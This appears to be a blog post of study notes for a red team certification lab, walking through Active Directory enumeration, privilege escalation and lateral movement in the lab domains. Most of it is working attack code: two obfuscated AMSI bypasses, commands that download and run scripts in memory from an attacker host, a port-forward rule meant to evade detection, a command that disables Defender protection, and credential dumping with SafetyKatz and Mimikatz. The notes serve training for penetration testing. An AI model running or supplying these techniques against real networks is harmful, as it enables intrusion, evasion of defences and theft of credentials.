---
title: Certified Red Team Professional Notes
date: 2023-03-7 15:23
categories: [notes]
tags: [Windows, Active Directory]
--- 

# Certified Red Team Professional Notes

## Week 1

•  Enumerate useful information like users, groups, group memberships,
computers, user properties, trusts, ACLs etc. to map attack paths!

• Learn and practice different local privilege escalation techniques on a Windows machine.

• Hunt for local admin privileges on machines in the target domain using multiple methods.

• Abuse enterprise applications to execute complex attack paths that involve bypassing antivirus and pivoting to different machines.

### Learning Objective 1

Enumerating Users, Computers, Domain Admins, and Enterprise Admins.

#### Using PowerView

Start a PowerShell session using Invisi-Shell to avoid enhanced logging. (\AD\Tools\InvisiShell\RunWithRegistryNonAdmin.bat)

```powershell
C:\Users\studentx>cd \AD\Tools
C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
C:\AD\Tools>set COR_ENABLE_PROFILING=1
C:\AD\Tools>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-
b283c03916db}\InprocServer32" /f
The operation completed successfully.
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d
"C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.
C:\AD\Tools>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```

Load Powerview in the PowerShell Session

```powershell
. C:\Ad\Tools\PowerView.ps1
```
To see users in the domain, 

```powershell
Get-DomainUser
``` 

and to get only a specific property of all users, use the select-object cmdlet as such.

```powershell
Get-DomainUser | select -ExpandProperty samaccountname
```

To see domain computer objects

```powershell
Get-DomainComputer | select -ExpandProperty dnshostname
```

to see details of the DA group, can get SIDs, Membernames

```powershell
Get-DomainGroup -Identity "Domain Admins"
```

To enumerate members of the EA group

```powershell
Get-DomainGroupMember -Identity "Enterprise Admins"
```

If you are not in the root domain, this command will not work. You need to query the root domain as EA group is only present in the root of the forest.

```powershell
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

#### Using ADModule

In a different invisishell session, import the ADModule with

```powershell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll

and 

Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

Then you can begin user enumeration with 

```powershell
Get-ADUser -Filter *
```

Use the -Properties paramter to filter by the properties you want to see, for example

```powershell
Get-ADUser -Filter * -Properties * | select Samaccountname,Description
```

To list computers

```powershell
Get-ADComputer -Filter *
```

Enumerate Domain Administrators with

```powershell
Get-ADGroupMember -Identity 'Domain Admins'
```

Enumerate Enterprise Admins with

```powershell
Get-ADGroupMember -Identity 'Enterprise Admins' -Server moneycorp.local
```

### Learning Objective 2

Enumerate OUs, list all computers in the StudentMachines OU, List the GPOs, Enumerate GPO applied on the StudentMachines OU.

#### PowerView

To list all OUs

```powershell
Get-DomainOU
```

To only see the names of OUs

```powershell
Get-DomainOU | select -ExpandProperty name
```

Listing all computers in the StudentMachines OU more complicated

```powershell
(Get-DomainOU -Identity StudentMachines).distinguishedname |  %{Get-DomainComputer -SearchBase $_} | select name
```

To get GPOs

```powershell
Get-DomainGPO
```

To Enumerate GPO applied on the StudentMachines OU, you need to copy part of the gplink attribute from the output of the command below:

```powershell
(Get-DomainOU -Identity StudentMachines).gplink
```

The part you need to copy will look like 

`{7478F170-6A0C-490C-B355-
9E4618BC785D}`

Then, to see GPO applied to StudentMachines, use

```powershell
Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-
9E4618BC785D}'
```

With powershell magic, you can do this all in one command:

```powershell
Get-DomainGPO -Identity (Get-DomainOU -Identity StudentMachines).gplink.substring(11, (Get-DomainOU -Identity StudentMachines).gplink.length-72)
```

### Learning Objective 3

Enumerate ACL for DA group, and view modify rights and permissions for students.

#### Using PowerView

To enumerate ACLs in the Domain Admins Group

```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDS -Verbose
```

To check for modify rights/permissions, use `Find-InterestingDomainACL` from powerview as such

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<student name>"}
```

To see permissions for the RDP group 

```powershell
Find-InterestingDomainAcl -ResolveGUIDs |
?{$_.IdentityReferenceName -match "RDPUsers"}
```

### Learning Objective 4

#### Using Powerview

To enumerate all domains in the current forest

```powershell
Get-ForestDomain -Verbose
```

To map all the trusts of the domain 

```powershell
Get-DomainTrust
```

To list only the external trusts in the moneycorp.local forest

```powershell
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} |
?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

To identiy external trusts of the dollarcorp domain, we can use the below command.

```powershell
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

Since we have Bidirectional trust between these 2 forests, we can extract information from the eurocorp.local forest. You need either bi-directional or one-way trust from the eurocorp.local to dollarcorp to be able to use the below command.

```powershell
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -
Domain $_.Name}
```

### Learning Objective 5

In this learning objective we will exploit a service on our machine to elevate privileges to local admin. Then Identiy a machine on the domain where we have local admin access. Also we use privileges of a user on jenkins on a host to get admin privileges on the dcorp-ci server.

We begin by loading powerview after bypassing amsi. 

```powershell
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
```

We can use the abuse-function (`Invoke-ServiceAbuse`) and add our current domain user to the local Administrators group.

```powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp/student520' -Verbose
```

Logging in and out shows we have local administrator privileges.

For the next task, we will identify a machine in the domain where we have local admin using the Find-PSRemotingLocalAdminAccess.ps1

```powershell
C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
[snip]
PS C:\AD\Tools> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\AD\Tools> Find-PSRemotingLocalAdminAccess
```

We have admin access on dcorp-adminsrv and on the student machine, we can connect to dcorp-adminsrv using winrs as the student user with

```powershell
winrs -r:dcorp-adminsrv cmd
```

Or you can do it with PowerShell Remoting

```powershell
PS C:\AD\Tools> Enter-PSSession -ComputerName dcorpadminsrv.dollarcorp.moneycorp.local
PS C:\AD\Tools> [dcorpadminsrv.dollarcorp.moneycorp.local]C:\Users\studentx\Documents> whoami
dcorp\studentx
```

### Learning Objective 6

This learning objective focuses on setting up `BloodHound` to identify the shortest path to Domain Admins in the domain. BLoodhound uses neo4j graph database, so that needs to be set up first.

Install and start the neo4j service as follows:

```powershell
C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community4.4.5\bin>neo4j.bat install-service
Neo4j service installed
C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community4.4.5\bin>neo4j.bat start
```

Once the service is installed browse to localhost:7474 and login with neo4j:neo4j creds, and openblood hound from C:\AD\Tools|bloodHound-win32-x64\BloodHound-win-32-x64 and provide the details 

bolt://localhost:7687 and the user/pass you set in the previous step. Then run the .net AMSI bypass by using this

```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
 [DllImport("kernel32")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
 [DllImport("kernel32")]
 public static extern IntPtr LoadLibrary(string name);
 [DllImport("kernel32")]
 public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ =
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

Then run the following commands to run the collector: 
```powershell
C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS C:\AD\Tools> cd C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors
PS C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors> $ZQCUW
[snip .NET AMSI bypass]
PS C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors> .
.\SharpHound.ps1
PS C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors> InvokeBloodHound -CollectionMethod All -Verbose
2023-03-03T07:01:16.5006490-08:00|INFORMATION|This version of SharpHound is
compatible with the 4.2 Release of BloodHound
2023-03-03T07:01:16.8282702-08:00|INFORMATION|Resolved Collection Methods:
Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container,
RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-03-03T07:01:16.8595176-08:00|INFORMATION|Initializing SharpHound at 7:01
AM on 3/3/2023
2023-03-03T07:01:22.3601219-08:00|INFORMATION|Flags: Group, LocalAdmin,
GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps,
DCOM, SPNTargets, PSRemote
[snip]
SharpHound Enumeration Completed at 7:02 AM on 3/3/2023! Happy Graphing!
```
Once the data is uploaded to bloodhound, search for shortest path to domain admins, ctrl will toggle labels.
### Learning Objective 7

Identify a machine in the target domain where a domain admin session is available, and compromise the machine and escalate to prvileges to domain admin.

From our reverse shell we got on the CI machine through jenkins, we can grab PowerView from our attack machine and look for machines where a domain admin is logged in using Find-DomainUserLocation.

First you grab the sbloggingbypass.txt from the attackers machine with

```powershell
PS C:\Users\Administrator\.jenkins\workspace\Projectx> iex (iwr
http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
```

use the below command to bypass AMSI

```powershell
PS C:\Users\Administrator\.jenkins\workspace\Projectx> S`eT-It`em ( 'V'+'aR'
+ 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) )
; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL
)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -
f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'
s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -
f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f
('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(
${n`ULl},${t`RuE} )
```

Then download and executre PowerView in memory on the victim machine with 

```powershell
iex ((New-Object
Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
``` 

Make sure to host the file using HFS.exe or your prefered choice of hosting software. Then run

```powershell
Find-DomainUserLocation
```

This command can take a while, but you can see if there is a domain admin session available. You can abuse it by using winrs or powershell remoting. To use winrs,
use 

```powershell
winrs -r:dcorp-mgmt hostname;whoami
```

Then we can run safetykatz.exe on the dcorp-mgmt to extract credentials. To do that, we need to copy loader.exe on dcorp-mgmt from the dcorp-ci machine we have to avoid any downloading activity on dcorp-mgmt.

Run the following command on the reverse shell

```powershell
iwr http://172.16.100.20/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Then copy it to the victim machine as such

```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

Using winrs add the following port forward rule on dcorp-mgmt to avoid detected

```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.20"
```

Note that the $null variable is used to address output redirection issues. Use loader.exe to download and execute SafetyKatz.exe in memory on the dcorp-mgmt machine with this command on the reverse shell

```powershell
$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```

To do it with powershell remoting, first check we can run commands on the dcorp-mgmt machine with 

```powershell
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt
```

Then we'll use Invoke-Mimi.ps1. Start by hosting it on your machine and running this on the reverse shell

```powershell
iex (iwr http://172.16.100.20/Invoke-Mimi.ps1 -UseBasicParsing)
```

Then we need to disable AMSI on the dcorp-mgmt machine, we can do the AMSI bypass shown earlier or use the built in Set-MpPreference as well because we are admins on the dcorp-mgmt machine.

```powershell
$sess = New-PsSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-Command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
```